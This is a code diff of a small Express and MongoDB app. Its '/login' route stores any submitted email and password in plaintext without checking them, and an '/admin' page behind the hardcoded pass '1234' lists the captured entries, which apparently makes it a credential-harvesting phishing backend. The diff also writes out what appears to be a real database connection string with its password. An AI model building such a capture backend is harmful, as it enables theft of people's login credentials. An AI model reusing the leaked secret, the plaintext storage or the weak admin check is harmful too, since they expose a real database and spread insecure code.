@@ -9,10 +9,11 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ---- MongoDB ----
-mongoose.connect('mongodb+srv://<USERNAME>:<PASSWORD>@<CLUSTER>.mongodb.net/clashdb', {
+mongoose.connect('mongodb+srv://sittubittus:db_W6PXYmt8tefZ7f4q@cluster0.ss60ylm.mongodb.net/clashdb?retryWrites=true&w=majority&appName=Cluster0', {
     useNewUrlParser: true,
     useUnifiedTopology: true
-});
+}).then(() => console.log("MongoDB Connected"))
+  .catch(err => console.error("MongoDB Connection Error:", err));
 
 // ---- Schema ----
 const User = mongoose.model('User', new mongoose.Schema({
@@ -23,12 +24,17 @@ const User = mongoose.model('User', new mongoose.Schema({
 
 // ---- Save user ----
 app.post('/login', async (req, res) => {
-    await User.create({ email: req.body.email, password: req.body.password });
-    res.json({ success: true });
+    try {
+        await User.create({ email: req.body.email, password: req.body.password });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ success: false });
+    }
 });
 
 // ---- Admin ----
-const ADMIN_PASS = "1234"; // Change this
+const ADMIN_PASS = "1234"; // Change this for security
 app.get('/admin', async (req, res) => {
     if (req.query.pass !== ADMIN_PASS) return res.send("<h2>Access Denied</h2>");
     const users = await User.find().sort({ date: -1 });
